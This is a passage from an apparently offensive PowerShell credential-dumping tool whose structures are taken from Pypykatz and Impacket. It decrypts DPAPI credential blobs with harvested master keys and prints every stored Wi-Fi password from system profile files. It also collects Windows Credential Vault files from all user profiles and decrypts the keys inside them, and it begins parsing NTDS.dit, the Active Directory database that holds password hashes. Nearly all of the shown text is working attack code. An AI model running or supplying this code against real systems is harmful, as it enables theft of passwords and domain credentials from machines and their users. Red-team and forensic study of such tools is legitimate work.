	$ToHash = $OPAD + $A
	If ($Entropy) { $ToHash += $Entropy}
	$ToHash += $ToSign
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
		"SHA512" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
	}

	$Hasher.Key = $MasterKeyHash
	$ToHash = $HMAC
	If ($Entropy) { $ToHash += $Entropy}
	$ToHash += $ToSign
	$HMAC_Calculated3 = $Hasher.ComputeHash($ToHash)

	If ((@(Compare-Object $HMAC_Calculated1 $Signature -SyncWindow 0).Length -eq 0) -or (@(Compare-Object $HMAC_Calculated3 $Signature -SyncWindow 0).Length -eq 0))
	{
		return $ClearText
	}
	Else
	{
		return $Null
	}
}

<### Decrypt a credential file ###>

function Decrypt-CredentialFile($FilePath, $MasterKeys)
{
	<#
		Decrypt-CredentialFile:
			- A Credential File contain a DPAPI Blob that contain secrets
	#>
	$CFContent = Get-Content $FilePath

	# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CredentialFile
	$Version = [BitConverter]::ToUInt32($CFContent[0..3], 0)
	$Size = [BitConverter]::ToUInt32($CFContent[4..7], 0)
	$Unknown = [BitConverter]::ToUInt32($CFContent[8..11], 0)
	$Data = $CFContent[12..$(12+$Size-1)]

	$DecryptedBlob = Decrypt-DPAPIBlob $Data $MasterKeys $Null
	If ($DecryptedBlob)
	{
		# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDBLOBTYPE
		# Identify $CREDENTIAL_BLOB["Type"]
		$CREDBLOBTYPE = @{}
		$CREDBLOBTYPE["UNKNOWN"] = 0
		$CREDBLOBTYPE["GENERIC"] = 1
		$CREDBLOBTYPE["DOMAIN_PASSWORD"] = 2
		$CREDBLOBTYPE["DOMAIN_CERTIFICATE"] = 3
		$CREDBLOBTYPE["DOMAIN_VISIBLE_PASSWORD"] = 4
		$CREDBLOBTYPE["GENERIC_CERTIFICATE"] = 5
		$CREDBLOBTYPE["DOMAIN_EXTENDED"] = 6

		# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDENTIAL_BLOB
		$CREDENTIAL_BLOB = @{}
		$CREDENTIAL_BLOB["Flags"] = [BitConverter]::ToUInt32($DecryptedBlob[0..3], 0)
		$CREDENTIAL_BLOB["Size"] = [BitConverter]::ToUInt32($DecryptedBlob[4..7], 0)
		$CREDENTIAL_BLOB["Unknown0"] = [BitConverter]::ToUInt32($DecryptedBlob[8..11], 0)
		$CREDENTIAL_BLOB["Type"] = [BitConverter]::ToUInt32($DecryptedBlob[12..15], 0)
		$CREDENTIAL_BLOB["Flags2"] = [BitConverter]::ToUInt32($DecryptedBlob[16..19], 0)
		$CREDENTIAL_BLOB["Last_Written"] = [BitConverter]::ToUInt32($DecryptedBlob[20..27], 0)
		$CREDENTIAL_BLOB["Unknown1"] = [BitConverter]::ToUInt32($DecryptedBlob[28..31], 0)
		$CREDENTIAL_BLOB["Persist"] = [BitConverter]::ToUInt32($DecryptedBlob[32..35], 0)
		$CREDENTIAL_BLOB["Attributes_Count"] = [BitConverter]::ToUInt32($DecryptedBlob[36..39], 0)
		$CREDENTIAL_BLOB["Unknown2"] = [BitConverter]::ToUInt32($DecryptedBlob[40..47], 0)
		$CREDENTIAL_BLOB["TargetLength"] = [BitConverter]::ToUInt32($DecryptedBlob[48..51], 0)
		If ($CREDENTIAL_BLOB["TargetLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Target"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[52..$(52+$CREDENTIAL_BLOB["TargetLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Target"] = $Null }
		$X = 52 + $CREDENTIAL_BLOB["TargetLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["TargetAliasLength"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		If ($CREDENTIAL_BLOB["TargetAliasLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["TargetAlias"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["TargetAliasLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["TargetAlias"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["TargetAliasLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["DescriptionLength"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		If ($CREDENTIAL_BLOB["DescriptionLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Description"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["DescriptionLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Description"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["DescriptionLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["Unknown3Length"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		$X = $Y
		$Y = $X + $CREDENTIAL_BLOB["Unknown3Length"]
		If ($CREDENTIAL_BLOB["Unknown3Length"] -ge 1)
		{
			$CREDENTIAL_BLOB["Unknown3"] = $DecryptedBlob[$($X)..$($Y-1)]
		}
		Else { $CREDENTIAL_BLOB["Unknown3"] = $Null }
		$X = $Y
		$Y = $X + 4
		$CREDENTIAL_BLOB["UsernameLength"] = $DecryptedBlob[$($X)..$($Y-1)]
		If ($CREDENTIAL_BLOB["UsernameLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Username"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["UsernameLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Username"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["UsernameLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["Unknown4Length"] = $DecryptedBlob[$($X)..$($Y-1)]
		If ($CREDENTIAL_BLOB["Unknown4Length"] -ge 1)
		{
			$CREDENTIAL_BLOB["Unknown4"] = $DecryptedBlob[$($X)..$($Y-1)]
		}
		Else { $CREDENTIAL_BLOB["Unknown4"] = $Null }

		$X = $Y
		$CREDENTIAL_BLOB["Attributes"] = ,(,@())
		For ($i = 0; $i -lt $CREDENTIAL_BLOB["Attributes_Count"]; $i += 1)
		{
			# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDENTIAL_ATTRIBUTE
			$CRED_ATTRIBUTE = @{}
			$CRED_ATTRIBUTE["Flags"] = $DecryptedBlob[$($X)..$($X+3)]
			$CRED_ATTRIBUTE["KeywordLength"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X+4)..$($X+7)], 0)
			If ($CRED_ATTRIBUTE["KeywordLength"] -ge 1)
			{
				$CRED_ATTRIBUTE["Keyword"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($X+8)..$($X+8+$CRED_ATTRIBUTE["KeywordLength"]-1)])
			}
			Else { $CRED_ATTRIBUTE["Keyword"] = $Null }
			$X = $X + 8 + $CRED_ATTRIBUTE["KeywordLength"]
			$CRED_ATTRIBUTE["DataLength"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X)..$($X+3)], 0)
			$CRED_ATTRIBUTE["Data"] = [BitConverter]::ToUInt32($DecryptedBlob[$($X+4)..$($X+4+$CRED_ATTRIBUTE["DataLength"]-1)], 0)

			$CREDENTIAL_BLOB["Attributes"] += $CRED_ATTRIBUTE

			$X = $X + 4 + $CRED_ATTRIBUTE["DataLength"]
		}

		return $CREDENTIAL_BLOB
	}
	Else
	{
		Write-Host ("[...] None MasterKeys allowed to decrypt CredentialFile")
		return $Null
	}
}

<### Find DPAPI secrets and try to decrypt them ###>

function Get-WiFiPwds($MasterKeys)
{
	<#
		Get-WiFiPwds: With System MasterKeys we can always decrypt Wi-Fi pwds
			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
	#>
	Write-Host ("`n[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")

	If (Test-Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*")
	{
		ForEach ($Child in (Get-ChildItem -Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*"))
		{
			$FileName = $Child.FullName
			If (($FileName).Substring(($FileName.Length-4), 4) -eq ".xml")
			{
				$Content = Get-Content $FileName -Raw
				$Name1 = $Content.IndexOf("<name>")
				If ($Name1 -ne -1)
				{
					$Name2 = $Content.IndexOf("</name>")
					$SSID = $Content.Substring($Name1 + 6, $Name2 - ($Name1 + 6))

					$KeyMaterial1 = $Content.IndexOf("<keyMaterial>")
					If ($KeyMaterial1 -ne -1)
					{
						$KeyMaterial2 = $Content.IndexOf("</keyMaterial>")
						$EncHexBlob = $Content.Substring($KeyMaterial1 + 13, $KeyMaterial2 - ($KeyMaterial1 + 13))
						$EncBlob = HexStringToBytes $EncHexBlob
						$BytesKey = Decrypt-DPAPIBlob $EncBlob $MasterKeys $Null
						If ($BytesKey)
						{
							$StringKey = [System.Text.Encoding]::ASCII.GetString($BytesKey)
							Write-Host ("[+] Key for SSID {0} = {1}" -f ($SSID, $StringKey))
						}
						Else
						{
							Write-Host ("[-] No MasterKey found for decrypting key for SSID {0}" -f ($SSID))
						}
					}
					Else
					{
						Write-Host ("[-] No key found for SSID {0}" -f ($SSID))
					}
				}
			}
		}
	}
	Else { Write-Host "[-] No Wi-Fi pwds configured" }
}

function Get-CredentialVaultManager($MasterKeys)
{
	<#
		Get-CredentialVaultManager:
			1- Find all VPOL files and try to decrypt them with gathered MasterKeys
			2- From decrypted VPOL files we get two keys for each
			3- Find all VCRD files and try to decrypt them with each keys gained from VPOL files
	#>

	Write-Host ("`n[===] Search VPOL and VCRD Files and decrypt them [===]")

	$VPOLPaths = @()
	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
	{
		ForEach ($Subfolder in ("Local", "Roaming", "LocalLow"))
		{
			$Path = "C:\Users\$User\AppData\$Subfolder\Microsoft\Vault"
			If (Test-Path $Path)
			{
				ForEach ($Item in (Get-ChildItem $Path -Force))
				{
					If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
					{
						If (Test-Path "$Path\$Item\Policy.vpol")
						{
							$VPOLPaths += ,("$Path\$Item\Policy.vpol")
						}
					}
				}
			}
		}
	}
	If (Test-Path "C:\ProgramData\Microsoft\Vault")
	{
		ForEach ($Item in (Get-ChildItem "C:\ProgramData\Microsoft\Vault" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
			{
				If (Test-Path "C:\ProgramData\Microsoft\Vault\$Item\Policy.vpol")
				{
					$VPOLPaths += ,("C:\ProgramData\Microsoft\Vault\$Item\Policy.vpol")
				}
			}
		}
	}
	If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault")
	{
		ForEach ($Item in (Get-ChildItem "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
			{
				If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\$Item\Policy.vpol")
				{
					$VPOLPaths += ,("C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\$Item\Policy.vpol")
				}
			}
		}
	}

	$VPOLKeys = @()
	ForEach ($VPOLPath in $VPOLPaths)
	{
		Write-Host ("[+] Found VPOL File {0}" -f ($VPOLPath))
		$VPOLBytes = [System.IO.File]::ReadAllBytes($VPOLPath)

		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VPOL
		$Version = [BitConverter]::ToUInt32($VPOLBytes[0..3], 0)
		$MKGUID1 = MKGUID $VPOLBytes[4..19]
		$DescriptionLength = [BitConverter]::ToUInt32($VPOLBytes[20..23], 0)
		$X = 24
		$Y = $X + $DescriptionLength
		$Description = $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 12
		$Unknown0 = $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 4
		$Size = [BitConverter]::ToUInt32($VPOLBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + 16
		$MKGUID2 = MKGUID $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 16
		$MKGUID3 = MKGUID $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 4
		$KeySize = [BitConverter]::ToUInt32($VPOLBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + $KeySize
		$DPAPIBlob = $VPOLBytes[$X..($Y-1)]
		$VPOLDecrypted = Decrypt-DPAPIBlob $DPAPIBlob $MasterKeys $Null
		If ($VPOLDecrypted)
		{
			For ($i = 0; $i -lt 2; $i += 1)
			{
				# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VPOL_KEYS
				If (($VPOLDecrypted[0] -eq [byte]36) -or ($VPOLDecrypted[0] -eq [byte]52))
				{
					# Structure from Pypykatz DPAPI/Structures/Vault : KDBM
					$Size = [BitConverter]::ToUInt32($VPOLDecrypted[0..3], 0)
					$Version = [BitConverter]::ToUInt32($VPOLDecrypted[4..7], 0)
					$Unknown0 = [BitConverter]::ToUInt32($VPOLDecrypted[8..11], 0)

					# Structure from Pypykatz DPAPI/Structures/Vault : BCRYPT_KEY_DATA_BLOB_HEADER
					$BCRYPT_KEY_DATA_BLOB_HEADER = $VPOLDecrypted[12..(12+$Size-8)]
					$Magic = [BitConverter]::ToUInt32($BCRYPT_KEY_DATA_BLOB_HEADER[0..3], 0)
					$Version = [BitConverter]::ToUInt32($BCRYPT_KEY_DATA_BLOB_HEADER[4..7], 0)
					$KeyData = [BitConverter]::ToUInt32($BCRYPT_KEY_DATA_BLOB_HEADER[8..11], 0)
					$Key = $BCRYPT_KEY_DATA_BLOB_HEADER[12..(12+$KeyData-1)]
					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
					$VPOLKeys += ,($Key)
					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))

					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
				}
				Else
				{
					# Structure from Pypykatz DPAPI/Structures/Vault : KSSM
					$Size = [BitConverter]::ToUInt32($VPOLDecrypted[0..3], 0)
					$Version = [BitConverter]::ToUInt32($VPOLDecrypted[4..7], 0)
					$Unknown0 = [BitConverter]::ToUInt32($VPOLDecrypted[8..11], 0)
					$Key = $VPOLDecrypted[12..(12+$Size-8)]
					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
					$VPOLKeys += ,($Key)
					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))

					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
				}
			}
		}
		Else
		{
			Write-Host "[...] None MasterKeys allowed to decrypt VPOL File"
		}
	}

	<# Unable to find valid VCRD files
	$VCRDPaths = @()
	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
	{
		ForEach ($Subfolder in ("Local", "Roaming", "LocalLow"))
		{
			$Path = "C:\Users\$User\AppData\$Subfolder\Microsoft\Credentials"
			If (Test-Path $Path)
			{
				ForEach ($Item in (Get-ChildItem $Path -Force))
				{
					If ($Item -Match "[A-Za-z0-9]{32}")
					{
						$VCRDPaths += ,("$Path\$Item")
					}
				}
			}
		}
	}
	If (Test-Path "C:\ProgramData\Microsoft\Credentials")
	{
		ForEach ($Item in (Get-ChildItem "C:\ProgramData\Microsoft\Credentials" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]{32}")
			{
				If (Test-Path "C:\ProgramData\Microsoft\Credentials\$Item")
				{
					$VCRDPaths += ,("C:\ProgramData\Microsoft\Credentials\$Item")
				}
			}
		}
	}
	If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials")
	{
		ForEach ($Item in (Get-ChildItem "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]{32}")
			{
				If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$Item")
				{
					$VCRDPaths += ,("C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$Item")
				}
			}
		}
	}

	ForEach ($VCRDPath in $VCRDPaths)
	{
		Write-Host ("[+] Decrypt VCRD File {0} with VPOL Keys" -f ($VCRDPath))
		$VCRDBytes = [System.IO.File]::ReadAllBytes($VCRDPath)

		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VCRD
		$SchemaMKGUID = MKGUID $VCRDBytes[0..15]
		$Unknown0 = [BitConverter]::ToUInt32($VCRDBytes[16..19], 0)
		$LastWritten = [BitConverter]::ToUInt32($VCRDBytes[20..27], 0)
		$Unknown1 = $VCRDBytes[28..31]
		$Unknown2 = $VCRDBytes[32..35]
		$FriendlyName_Length = [BitConverter]::ToUInt32($VCRDBytes[36..39], 0)
		$X = 40
		$Y = $X + $FriendlyName_Length
		$FriendlyName = $VCRDBytes[$X..($Y-1)]
		If ($FriendlyName_Length -gt 0)
		{
			$FriendlyName = [System.Text.Encoding]::Unicode.GetString($FriendlyName)
			Write-Host ("[...] Friendly name = {0}" -f ($FriendlyName))
		}
		Else { Write-Host "[...] Friendly name = <Empty>" }
		$X = $Y
		$Y = $X + 4
		$AttributeMaps_Length = [BitConverter]::ToUInt32($VCRDBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + $AttributeMaps_Length
		$AttributeMaps = $VCRDBytes[$X..($Y-1)]

		$DB = $AttributeMaps
		$Vames = @()
		For ($i = 0; $i -lt [System.Math]::Floor($AttributeMaps_Length / 12); $i += 1)
		{
			$Vame = @{}

			# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE_MAP_ENTRY
			$Vame["ID"] = [BitConverter]::ToUInt32($DB[0..3], 0)
			$Vame["Offset"] = [BitConverter]::ToUInt32($DB[4..7], 0)
			$Unknown = [BitConverter]::ToUInt32($DB[8..11], 0)
			$Vames += ,($Vame)

			$DB = $DB[12..($DB.Length-1)]
		}

		$Attributes = @()
		For ($i = 0; $i -lt $Vames.Length-1; $i += 1)
		{
			$Data = $VCRDBytes[($Vames[$i]["Offset"])..($Vames[$i+1]["Offset"] - $Vames[$i]["Offset"])]

			$Attribute = @{}
			# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE
			$Size = $Data.Length
			$Attribute["ID"] = [BitConverter]::ToUInt32($Data[0..3], 0)
			$Unknown0 = $Data[4..7]
			$Unknown1 = $Data[8..11]
			$Unknown2 = $Data[12..15]

			If ($Size -gt 20)
			{
				$Test = $Data[16..21]
				If (@(Compare-Object $Test ((,[byte]0) * 6) -SyncWindow 0).Length -eq 0) { $Attribute["Padding"] = $Test }

				$X = 16
				If ($ID -ge 100) { $Unknown3 = $Data[$X..19]; $X = 20 }
			}

			If ($Size -gt 25)
			{
				$Y = $X + 4
				$Attribute["Size"] = [BitConverter]::ToUInt32($Data[$X..($Y-1)], 0)
				$X = $Y
				$Attribute["IVPresent"] = $Data[$X]
				$X = $X + 1
				If ($Attribute["IVPresent"])
				{
					$Y = $X + 4
					$Attribute["IVSize"] = [BitConverter]::ToUInt32($Data[$X..($Y-1)], 0)
					$X = $Y
					$Y = $X + $Attribute["IVSize"]
					$Attribute["IV"] = $Data[$X..($Y-1)]
					$X = $Y
					$Y = $X + ($Attribute["Size"] - ($Attribute["IVSize"] + 5))
					$Attribute["Data"] = $Data[$X..($Y-1)]
				}
				Else
				{
					$Y = $X + $Attribute["Size"] - 1
					$Attribute["Data"] = $Data[$X..($Y-1)]
				}
			}

			$Attributes += ,($Attribute)
		}
		$X = $Vames[$Vames.Length-1]["Offset"]
		$Data = $VCRDBytes[$X..($VCRDBytes.Length-1)]
		$Attribute = @{}
		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE
		$Size = $Data.Length
		$Attribute["ID"] = [BitConverter]::ToUInt32($Data[0..3], 0)
		$Unknown0 = $Data[4..7]
		$Unknown1 = $Data[8..11]
		$Unknown2 = $Data[12..15]

		If ($Size -gt 20)
		{
			$Test = $Data[16..21]
			If (@(Compare-Object $Test ((,[byte]0) * 6) -SyncWindow 0).Length -eq 0) { $Attribute["Padding"] = $Test }

			$X = 16
			If ($ID -ge 100) { $Unknown3 = $Data[$X..19]; $X = 20 }
		}

		If ($Size -gt 25)
		{
			$Y = $X + 4
			$Attribute["Size"] = [BitConverter]::ToUInt32($Data[$X..($Y-1)], 0)
			$X = $Y
			$Attribute["IVPresent"] = $Data[$X]
			$X = $X + 1
			If ($Attribute["IVPresent"])
			{
				$Y = $X + 4
				$Attribute["IVSize"] = [BitConverter]::ToUInt32($Data[$X..($Y-1)], 0)
				$X = $Y
				$Y = $X + $Attribute["IVSize"]
				$Attribute["IV"] = $Data[$X..($Y-1)]
				$X = $Y
				$Y = $X + ($Attribute["Size"] - ($Attribute["IVSize"] + 5))
				$Attribute["Data"] = $Data[$X..($Y-1)]
			}
			Else
			{
				$Y = $X + $Attribute["Size"] - 1
				$Attribute["Data"] = $Data[$X..($Y-1)]
			}
		}
		$Attributes += ,($Attribute)

		ForEach ($VPOLKey in $VPOLKeys)
		{
			Write-Host ("[...] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
			ForEach ($Attribute in $Attributes)
			{
				If ($Attribute["Data"])
				{
					If ($Attribute["IV"])
					{
						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] $Attribute["IV"] ([Security.Cryptography.CipherMode]::CBC) $False
						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
					}
					Else
					{
						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] ((,[byte]0) * 16) ([Security.Cryptography.CipherMode]::CBC) $False
						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
					}
				}
			}
		}
	}
	#>
}

function Get-DPAPISecrets($MasterKeys)
{
	<#
		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys
			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed
			- Decrypting VPOL Files with System and User MasterKeys -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
	#>

	Get-WiFiPwds $MasterKeys
	Get-CredentialVaultManager $MasterKeys
}

<############>
<# NTDS.dit #>
<############>

$Global:PageTables = @{}
$Global:CurrentTable = ""

function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSize)
{
	$Record = @{}
	$TaggedItems = @()
	$TaggedItemsParsed = $False

	# Structure from Impacket "ese.py" : ESENT_DATA_DEFINITION_HEADER
	$DataDefinitionHeader = @{}
	$DataDefinitionHeader["LastFixedSize"] = [UInt32]($Tag[0])
	$DataDefinitionHeader["LastVariableDataType"] = [UInt32]($Tag[1])
	$DataDefinitionHeader["VariableSizeOffset"] = [BitConverter]::ToUInt16($Tag[2..3], 0)

	$VariableDataBytesProcessed = ($DataDefinitionHeader["LastVariableDataType"] - 127) * 2
	$PrevItemLen = 0
	$TagLen = $Tag.Length
	$FixedSizeOffset = 4
	$VariableSizeOffset = $DataDefinitionHeader["VariableSizeOffset"]

	$Columns = $Cursor["TableData"]["Columns"]

	ForEach ($Column in $Columns.Keys)
	{
		If ($FilterTables)
		{
			If (-not ($FilterTables.Keys -Contains $Column)) { Continue }
		}

		$ColumnRecord = $Columns[$Column]["Record"]
		If ($ColumnRecord["Identifier"] -lt $DataDefinitionHeader["LastFixedSize"])
		{
			# Fixed Size column data type, still available data
			$Record[$Column] = $Tag[$FixedSizeOffset..($FixedSizeOffset + $ColumnRecord["SpaceUsage"] - 1)]
			$FixedSizeOffset += $ColumnRecord["SpaceUsage"]
		}
		ElseIf ((127 -lt $ColumnRecord["Identifier"]) -and ($ColumnRecord["Identifier"] -le $DataDefinitionHeader["LastVariableDataType"]))
		{
			# Variable data type
			$Index = $ColumnRecord["Identifier"] - 127 - 1
			$ItemLen = [BitConverter]::ToUInt16($Tag[($VariableSizeOffset + ($Index * 2))..($VariableSizeOffset + ($Index * 2) + 1)], 0)

			If ($ItemLen -band 0x8000)
			{
				# Empty item
				$ItemLen = $PrevItemLen
				$Record[$Column] = $Null
			}
			Else
			{
				$ItemValue = $Tag[($VariableSizeOffset + $VariableDataBytesProcessed)..($VariableSizeOffset + $VariableDataBytesProcessed + ($ItemLen - $PrevItemLen) - 1)]
				$Record[$Column] = $ItemValue
			}

			$VariableDataBytesProcessed += ($ItemLen - $PrevItemLen)
			$PrevItemLen = $ItemLen
		}
		ElseIf ($ColumnRecord["Identifier"] -gt 255)
		{
			# Have we parsed the tagged items already ?
			If (($TaggedItemsParsed -eq $False) -and (($VariableDataBytesProcessed + $VariableSizeOffset) -lt $TagLen))
			{
				$Index = ($VariableDataBytesProcessed + $VariableSizeOffset)
				$EndOfVS = $PageSize
				$FirstOffsetTag = ([BitConverter]::ToUInt16($Tag[($Index + 2)..($Index + 2 + 1)], 0) -band 0x3fff) + ($VariableDataBytesProcessed + $VariableSizeOffset)
				While ($True)
				{
					$TaggedIdentifier = [BitConverter]::ToUInt16($Tag[$Index..($Index+1)], 0)
					$Index += 2
					$TaggedOffset = ([BitConverter]::ToUInt16($Tag[$Index..($Index+1)], 0) -band 0x3fff)
					# As of Windows 7 and later ( version 0x620 revision 0x11) the tagged data type flags are always present
					If (($Version -eq 0x620) -and ($Revision -ge 17) -and ($PageSize -gt 8192)) { $FlagsPresent = 1 }
					Else { $FlagsPresent = ([BitConverter]::ToUInt16($Tag[$Index..($Index+1)], 0) -band 0x4000) }
					$Index += 2
					If ($TaggedOffset -lt $EndOfVS) { $EndOfVS = $TaggedOffset }
					$TaggedItems += ,@($TaggedIdentifier, @($TaggedOffset, $TagLen, $FlagsPresent))
					If ($Index -ge $FirstOffsetTag) { Break }
				}

				# Calculate length of variable items
				For ($i = 0; $i -lt $TaggedItems.Length-1; $i += 1)
				{
					$Offset0, $Length0, $Flags0 = $TaggedItems[$i][1]
					$Offset, $Length, $Flags = $TaggedItems[$i+1][1]
					$Res = $Offset - $Offset0
					$TaggedItems[$i][1] = @($Offset0, $Res, $Flags0)
				}

				$TaggedItemsParsed = $True
			}

			# Tagged data type
			$Found = $False
			For ($i = 0; $i -lt $TaggedItems.Length; $i += 1)
			{
				If ($ColumnRecord["Identifier"] -eq $TaggedItems[$i][0])
				{
					$Found = $True
					$OffsetItem = ($VariableDataBytesProcessed + $VariableSizeOffset + $TaggedItems[$i][1][0])
					$ItemSize = $TaggedItems[$i][1][1]
					# If item have flags, we should skip them
					If ($TaggedItems[$i][1][2] -gt 0)
					{
						$ItemFlag = [UInt32]($Tag[$OffsetItem])
						$OffsetItem += 1
						$ItemSize -= 1
					}
					Else { $ItemFlag = 0 }

					$TAGGED_DATA_TYPE_COMPRESSED = 2
					$TAGGED_DATA_TYPE_MULTI_VALUE = 8
					If ($ItemFlag -band $TAGGED_DATA_TYPE_COMPRESSED)
					{
						Write-Host ("[...] Unsupported tag column: {0}, flag: 0x{1:X}" -f ($Column, $ItemFlag))
						$Record[$Column] = $Null
					}
					ElseIf ($ItemFlag -band $TAGGED_DATA_TYPE_MULTI_VALUE)
					{
						Write-Host ("[...] Multivalue detected in column {0}, returning raw results" -f ($Column))
						$Record[$Column] = $Tag[$OffsetItem..($OffsetItem + $ItemSize - 1)]
					}
					Else
					{
						$Record[$Column] = $Tag[$OffsetItem..($OffsetItem + $ItemSize - 1)]
					}
				}
			}

			If (-not $Found)
			{
				$Record[$Column] = $Null
			}
		}
		Else
		{
			$Record[$Column] = $Null
		}

		# Decode the data
		# If we understand the data type, we unpack it and cast it accordingly
        # otherwise, we just encode it in hex
		$JET_coltypText = 10
		$JET_coltypLongText = 12
		If ($Record[$Column])
		{
			# If multi types data ?
			$MultiTypes = $False
			$Types = @()
			ForEach ($Item in $Record[$Column])
			{
				If (-not ($Types -Contains $Item.GetType().Name)) { $Types += $Item.GetType().Name }
			}
			If ($Types.Length -gt 1) { $MultiTypes = $True }

			If ($MultiTypes)
			{
				# A multi value data, we won't decode it, just leave it this way
				$Record[$Column] = $Record[$Column][0]
			}
			# Else if string ?
			ElseIf (($ColumnRecord["ColumnType"] -eq $JET_coltypText) -or ($ColumnRecord["ColumnType"] -eq $JET_coltypLongText))
			{
				# Let's handle strings
				$StringCodePages = @(1200, 20127)
				If (-not ($StringCodePages -Contains $ColumnRecord["CodePage"]))
				{
					Write-Host ("[...] Unknown codepage 0x{0:X}" -f ($ColumnRecord["CodePage"]))
				}
				Else
				{
					$StringDecoder = $ColumnRecord["CodePage"]
					Try
					{
						Switch ($StringDecoder)
						{
							1200 { $Record[$Column] = [System.Text.Encoding]::Unicode.GetString($Record[$Column]) }
							20127 { $Record[$Column] = [System.Text.Encoding]::ASCII.GetString($Record[$Column]) }
						}
					}
					Catch {}
				}
			}
			# Else unpack according to column type
			Else
			{
				$ColumnTypeSize = @{}
				$ColumnTypeSize[0] = $Null
				$ColumnTypeSize[1] = @(1, "Byte")
				$ColumnTypeSize[2] = @(1, "Byte")
				$ColumnTypeSize[3] = @(2, "Short")
